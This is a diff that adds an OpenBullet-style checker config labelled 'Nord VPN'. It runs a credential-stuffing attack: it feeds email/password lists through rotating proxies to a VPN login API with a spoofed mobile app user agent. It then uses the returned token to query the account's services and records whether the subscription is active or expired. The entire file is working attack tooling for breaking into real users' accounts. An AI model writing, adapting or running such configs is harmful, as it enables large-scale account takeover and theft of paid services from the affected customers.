@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "Nord VPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-04T20:13:42.6713754-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: NordApp android (playstore/2.8.6) Android 8.1.0" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Retry OR 
+    KEY "502: Bad gateway" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+FUNCTION Base64Encode "token:<token>" -> VAR "b64token" 
+
+REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Basic <b64token>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "created_at" 
+  KEYCHAIN Failure OR 
+    KEY "[]" 
+
+PARSE "<SOURCE>" JSON "expires_at" -> CAP "Expiration" 
+
+FUNCTION CurrentUnixTime -> VAR "currentTime" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd HH:mm:ss" "<Expiration>" -> VAR "checkTime" 
+
+IF "<checkTime>" GREATERTHAN "<currentTime>"
+SET STATUS SUCCESS
+ELSE
+SET STATUS CUSTOM "EXPIRED"
+ENDIF
